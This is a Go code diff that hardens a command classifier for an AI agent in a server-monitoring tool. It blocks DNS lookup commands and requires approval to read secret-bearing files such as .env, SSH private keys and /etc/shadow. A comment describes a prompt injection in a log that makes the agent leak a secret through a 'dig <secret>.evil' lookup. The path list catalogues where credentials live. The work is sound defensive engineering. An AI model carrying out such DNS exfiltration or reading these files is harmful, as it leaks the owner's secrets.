@@ -5,6 +5,8 @@ package aiagent
 
 import (
 	"errors"
+	"net"
+	"path"
 	"strings"
 
 	"github.com/askidmobile/srvmon/internal/i18n"
@@ -19,6 +21,13 @@ import (
 // quoted arguments. Rejected outright: ; & || && redirections, command
 // substitution, variables, subshells, unquoted globs, env assignments, paths
 // to binaries, sudo and anything not on the list.
+//
+// Two more things need the owner although they change nothing: words that
+// name files which usually hold secrets (.env, private keys, /etc/shadow,
+// /proc/PID/environ), and anything that sends a query to a host the command
+// names (DNS lookups, ping by name). A prompt injection in a log could
+// otherwise make the agent read a secret and leak it as `dig <secret>.evil`.
+// Output of the commands that do run goes through Redact.
 func Classify(cmd string) (readOnly bool, reason string) {
 	segs, err := splitPipeline(cmd)
 	if err != nil {
@@ -27,6 +36,11 @@ func Classify(cmd string) (readOnly bool, reason string) {
 	for _, words := range segs {
 		if len(words) == 0 {
 			return false, i18n.T("empty command in a pipeline")
+		}
+		for _, w := range words[1:] {
+			if secretPath(w) {
+				return false, i18n.T("%s may hold secrets", w)
+			}
 		}
 		if r := checkProgram(words); r != "" {
 			return false, r
@@ -110,7 +124,7 @@ func splitPipeline(cmd string) ([][]string, error) {
 var anyArgs = set("cat", "head", "tail", "grep", "egrep", "fgrep", "zgrep", "zcat", "ls", "df", "du", "free",
 	"uptime", "uname", "whoami", "id", "ps", "pgrep", "wc", "cut", "tr", "stat",
 	"which", "lscpu", "lsblk", "lsmem", "nproc", "vmstat", "iostat", "mpstat", "w", "who", "last",
-	"netstat", "jq", "md5sum", "sha256sum", "getent", "lsof", "ping", "dig", "nslookup", "host", "findmnt",
+	"netstat", "jq", "md5sum", "sha256sum", "lsof", "findmnt",
 	"lsb_release", "basename", "dirname", "realpath", "readlink", "column", "nl", "rev", "true", "echo",
 	"printf", "tac", "diff", "cmp", "sha1sum", "base64", "blkid", "lspci", "lsusb", "arch")
 
@@ -156,6 +170,12 @@ func checkProgram(words []string) string {
 		return checkSort(words)
 	case "date":
 		return checkDate(words)
+	case "dig", "nslookup", "host", "drill":
+		return i18n.T("%s sends DNS queries", prog)
+	case "ping":
+		return checkPing(words)
+	case "getent":
+		return checkGetent(words)
 	case "hostname":
 		for _, w := range words[1:] {
 			if !hostnameFlags[w] {
@@ -544,4 +564,88 @@ func isInt(s string) bool {
 		}
 	}
 	return true
+}
+
+// secretPath reports whether a word names a file that usually holds
+// secrets. The value of --opt=FILE is checked too. Listing a directory
+// (ls ~/.ssh) is fine; reading what is in it is not.
+func secretPath(w string) bool {
+	if i := strings.LastIndexByte(w, '='); i >= 0 && strings.HasPrefix(w, "-") {
+		w = w[i+1:]
+	}
+	if w == "" || (strings.HasPrefix(w, "-") && !strings.Contains(w, "/")) {
+		return false
+	}
+	p := strings.ToLower(path.Clean(w))
+	b := path.Base(p)
+	dir := "/" + strings.Trim(path.Dir(p), "/") + "/"
+	switch {
+	case b == ".env" || strings.HasPrefix(b, ".env.") || strings.HasSuffix(b, ".env"):
+		return true
+	case b == "shadow" || b == "gshadow" || b == "shadow-" || b == "gshadow-" || b == "environ":
+		return true
+	case b == ".netrc" || b == ".pgpass" || b == ".git-credentials" || b == ".my.cnf" || b == "master.key":
+		return true
+	case strings.HasPrefix(b, "id_") && !strings.HasSuffix(b, ".pub") &&
+		(strings.Contains(b, "rsa") || strings.Contains(b, "dsa") || strings.Contains(b, "ed25519")):
+		return true
+	}
+	switch path.Ext(b) {
+	case ".key", ".p12", ".pfx", ".jks", ".keystore", ".kdbx", ".ppk":
+		return true
+	case ".pem":
+		if strings.Contains(b, "key") || strings.Contains(b, "priv") {
+			return true
+		}
+	}
+	for _, d := range []string{"/.ssh/", "/.gnupg/", "/.aws/", "/ssl/private/", "/run/secrets/", "/.kube/", "/.docker/"} {
+		if strings.Contains(dir, d) {
+			if d == "/.ssh/" && (b == "authorized_keys" || b == "known_hosts" || strings.HasSuffix(b, ".pub")) {
+				continue
+			}
+			return true
+		}
+	}
+	return false
+}
+
+var pingOpts = spec("-4 -6 -n -q -D -O -U -v", "-c -W -w -i -s -t")
+
+// checkPing allows ping to IP addresses only: a host name is a DNS query
+// whose name the command chooses (see Classify), and -p fills packets with
+// chosen bytes.
+func checkPing(words []string) string {
+	pos, why := parseOpts(words, pingOpts)
+	if why != "" {
+		return why
+	}
+	if len(pos) == 0 {
+		return i18n.T("%s without a subcommand", "ping")
+	}
+	for _, h := range pos {
+		if net.ParseIP(h) == nil {
+			return i18n.T("%s looks up %s in DNS", "ping", h)
+		}
+	}
+	return ""
+}
+
+var getentOpts = spec("-i --no-idn --help --version", "-s --service")
+
+// checkGetent allows local databases; host and network keys must be
+// addresses, since a name would be looked up in DNS.
+func checkGetent(words []string) string {
+	pos, why := parseOpts(words, getentOpts)
+	if why != "" || len(pos) < 2 {
+		return why
+	}
+	switch pos[0] {
+	case "hosts", "ahosts", "ahostsv4", "ahostsv6", "networks":
+		for _, k := range pos[1:] {
+			if net.ParseIP(k) == nil {
+				return i18n.T("%s looks up %s in DNS", "getent", k)
+			}
+		}
+	}
+	return ""
 }
